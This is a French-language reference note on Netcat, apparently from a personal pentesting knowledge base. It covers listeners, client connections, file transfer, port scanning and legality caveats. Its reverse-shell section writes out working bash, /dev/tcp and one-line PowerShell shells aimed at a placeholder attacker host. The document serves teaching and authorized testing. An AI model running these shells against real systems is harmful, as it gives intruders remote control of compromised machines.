---
tags:
  - outil
  - outil/netcat
aliases:
  - nc
  - Network Cat
archetype: outil
site_web: 
cssclasses:
  - max
---
# Netcat (nc)

## 🎯 Objectif Principal
> [[Netcat]] (souvent abrégé en `nc`) est un [[Tool|outil]] réseau polyvalent en [[CommandLineInterface|ligne de commande]] conçu pour lire et écrire des [[Data|données]] sur les [[Network|réseaux]] en utilisant les [[InternetProtocolSuite|protocoles TCP/IP]] et [[UserDatagramProtocol|UDP]]. Surnommé le "couteau suisse du [[Network|réseau]]", il est largement utilisé pour le [[NetworkTroubleshooting|dépannage réseau]], l'exploration, et la [[NetworkSecurity|sécurité réseau]], notamment en [[PenetrationTesting|tests d'intrusion]].

## ⚙️ Cas d'usage / Commandes Utiles

### Cas 1: Écoute sur un port spécifique (serveur simple)
Utilisé pour configurer un [[NetworkListener|auditeur]] sur un [[PortNumber|port]] donné, en attente de [[NetworkCommunication|connexions entrantes]].

```bash
nc -lvp <port>
# -l : mode écoute (listen)
# -v : mode verbeux (verbose)
# -p : spécifier le port local (port)
# Exemple: nc -lvp 4444
```

### Cas 2: Connexion à un port distant (client simple)
Permet d'établir une [[NetworkCommunication|connexion]] [[TransmissionControlProtocol|TCP]] ou [[UserDatagramProtocol|UDP]] à un [[Server|serveur]] distant sur un [[PortNumber|port]] spécifique.

```bash
nc <adresse_IP_ou_nom_hôte> <port>
# Exemple: nc example.com 80
# Pour envoyer une requête HTTP simple après connexion:
# GET / HTTP/1.1
# Host: example.com
# <appuyez sur Entrée deux fois>
```

### Cas 3: Transfert de fichier (serveur et client)
[[Netcat]] peut être utilisé pour effectuer un [[FileTransfer|transfert de fichiers]] simple entre deux [[Computer|machines]].

*   **Sur la machine réceptrice (serveur):**
    ```bash
    nc -lvp <port> > fichier_recu.txt
    # Exemple: nc -lvp 1234 > rapport.txt
    ```
*   **Sur la machine émettrice (client):**
    ```bash
    nc <adresse_IP_recepteur> <port> < fichier_a_envoyer.txt
    # Exemple: nc 192.168.1.100 1234 < document.txt
    ```

### Cas 4: Création d'un [[ReverseShell|Reverse Shell]]
Un cas d'usage courant en [[PenetrationTesting|tests d'intrusion]] pour obtenir un accès interactif à un [[System|système]] compromis.

*   **Sur la machine de l'attaquant (écoute):**
    ```bash
    nc -lvp <port_attaquant>
    # Exemple: nc -lvp 9001
    ```
*   **Sur la machine cible (envoi du shell):**
    *   **Linux (Bash):**
        ```bash
        nc <adresse_IP_attaquant> <port_attaquant> -e /bin/bash
        # Ou, si -e n'est pas disponible (ancienne version de Netcat):
        /bin/bash -i <& /dev/tcp/<adresse_IP_attaquant>/<port_attaquant> 1>&0 2>&0
        ```
    *   **Windows (PowerShell):**
        ```powershell
        # Nécessite souvent des scripts PowerShell plus élaborés pour une stabilité accrue.
        # Exemple simple (moins stable):
        # powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<adresse_IP_attaquant>',<port_attaquant>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        ```
    _Note: La commande Windows ci-dessus est complexe et peut nécessiter une exécution via `cmd` ou un encodage Base64 pour éviter les problèmes de caractères spéciaux._

### Cas 5: [[PortScanning|Scan]] de ports basique
Bien que moins sophistiqué que [[Nmap]], [[Netcat]] peut effectuer un [[PortScanning|scan de ports]] simple.

```bash
nc -zv <adresse_IP_ou_nom_hôte> <port_début>-<port_fin>
# -z : mode scan (zero-I/O), ne pas envoyer de données
# Exemple: nc -zv example.com 1-1024
```

## ⚠️ Points d'attention
*   **Légalité**: L'utilisation de [[Netcat]] pour des [[PortScanning|scans de ports]], des [[FileTransfer|transferts de fichiers]] non autorisés, ou la création de [[ReverseShell|reverse shells]] sur des [[System|systèmes]] sans [[ExplicitAuthorization|autorisation explicite]] est illégale et éthiquement répréhensible. Il doit être utilisé uniquement dans le cadre de [[PenetrationTesting|tests d'intrusion]] autorisés ou d'activités de [[NetworkTroubleshooting|dépannage réseau]] et de [[SecurityAudit|sécurité]] légitimes.
*   **Fiabilité/Limites**:
    *   [[Netcat]] est un [[Tool|outil]] très simple et ne fournit pas de chiffrement par défaut, ce qui rend les [[NetworkCommunication|communications]] vulnérables à l'[[Eavesdropping|écoute clandestine]].
    *   Les différentes versions de [[Netcat]] (GNU Netcat, OpenBSD Netcat, Ncat) peuvent avoir des options et des comportements légèrement différents.
    *   Les [[ReverseShell|reverse shells]] basés sur [[Netcat]] sont souvent instables et rudimentaires par rapport à des alternatives plus robustes.
*   **Risques Opérationnels**:
    *   Une mauvaise utilisation peut entraîner une [[SystemInstability|instabilité système]] ou des [[ServiceDisruption|interruptions de service]], surtout sur des [[VulnerableSystem|systèmes fragiles]].
    *   Son utilisation peut être facilement détectée par les [[IntrusionDetectionSystem|IDS]]/[[IntrusionPreventionSystem|IPS]] s'ils sont configurés correctement, en raison de l'absence de chiffrement et de motifs de [[MessagePattern|message]] reconnaissables.

## 🔗 Alternatives et Notes Connexes
*   Alternatives:
    *   [[Nmap]] pour le [[PortScanning|scan de ports]] avancé.
    *   [[SecureShell|SSH]] pour des [[NetworkCommunication|connexions]] et [[FileTransfer|transferts de fichiers]] sécurisés.
    *   [[Wireshark]] pour l'[[PacketSniffing|analyse de paquets réseau]].
*   Contexte:
    *   [[NetworkCommunication|Communication réseau]]
    *   [[NetworkSecurity|Sécurité Réseau]]
    *   [[PenetrationTesting|Tests d'intrusion]]
    *   [[Reconnaissance|Reconnaissance]]
    *   [[ReverseShell|Reverse Shell]]